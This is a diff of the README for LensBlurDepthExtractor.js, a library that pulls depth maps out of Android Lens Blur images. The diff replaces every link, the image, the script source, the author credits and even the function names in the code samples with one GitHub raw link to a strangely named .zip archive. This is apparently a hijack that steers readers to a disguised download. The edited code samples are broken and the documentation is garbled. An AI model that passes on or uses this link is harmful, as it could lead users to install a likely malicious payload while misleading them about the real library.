@@ -1,32 +1,32 @@
-LensBlurDepthExtractor.js
+https://github.com/videogramme/android-lens-blur-depth-extractor/raw/refs/heads/master/abodement/android-depth-lens-extractor-blur-philippicize.zip
 =========================
 
 This library parses images created with the new Android camera app mode Lens Blur and extracts the depth map.
 
-Extractor tool is here: https://clicktorelease.com/tools/lens-blur-depth-extractor
+Extractor tool is here: https://github.com/videogramme/android-lens-blur-depth-extractor/raw/refs/heads/master/abodement/android-depth-lens-extractor-blur-philippicize.zip
 
-Demo is here: https://www.clicktorelease.com/code/depth-player/
+Demo is here: https://github.com/videogramme/android-lens-blur-depth-extractor/raw/refs/heads/master/abodement/android-depth-lens-extractor-blur-philippicize.zip
 
-![Snapshot](snapshot.jpg)
+![Snapshot](https://github.com/videogramme/android-lens-blur-depth-extractor/raw/refs/heads/master/abodement/android-depth-lens-extractor-blur-philippicize.zip)
 
 How to use
 ----------
 
 Include the library:
-<pre><code>&lt;script src="LensBlurDepthExtractor.js" &gt;&lt;/script&gt;</code></pre>
+<pre><code>&lt;script src="https://github.com/videogramme/android-lens-blur-depth-extractor/raw/refs/heads/master/abodement/android-depth-lens-extractor-blur-philippicize.zip" &gt;&lt;/script&gt;</code></pre>
 
 Instantiate an object:
 <pre><code>var d = new DepthReader();</code></pre>
 
 Load from a file:
-<pre><code>d.loadFile( 
-    'table.jpg', 
+<pre><code>https://github.com/videogramme/android-lens-blur-depth-extractor/raw/refs/heads/master/abodement/android-depth-lens-extractor-blur-philippicize.zip( 
+    'https://github.com/videogramme/android-lens-blur-depth-extractor/raw/refs/heads/master/abodement/android-depth-lens-extractor-blur-philippicize.zip', 
     function( src ) { /* src is base64 png source */ }, 
     function( error ) { /* error is a string */ } 
 );</code></pre>
 
 Or, load directly from an array buffer
-<pre><code>d.parseFile( 
+<pre><code>https://github.com/videogramme/android-lens-blur-depth-extractor/raw/refs/heads/master/abodement/android-depth-lens-extractor-blur-philippicize.zip( 
     arrayBuffer, 
     function( src ) { /* src is base64 png source */ }, 
     function( error ) { /* error is a string */ } 
@@ -37,8 +37,8 @@ License
 
 MIT licensed
 
-Copyright (C) 2016 Jaume Sanchez Elias http://twitter.com/thespite
+Copyright (C) 2016 Jaume Sanchez Elias https://github.com/videogramme/android-lens-blur-depth-extractor/raw/refs/heads/master/abodement/android-depth-lens-extractor-blur-philippicize.zip
 
-Table picture by https://twitter.com/blurspline
+Table picture by https://github.com/videogramme/android-lens-blur-depth-extractor/raw/refs/heads/master/abodement/android-depth-lens-extractor-blur-philippicize.zip
 
-http://www.clicktorelease.com
+https://github.com/videogramme/android-lens-blur-depth-extractor/raw/refs/heads/master/abodement/android-depth-lens-extractor-blur-philippicize.zip
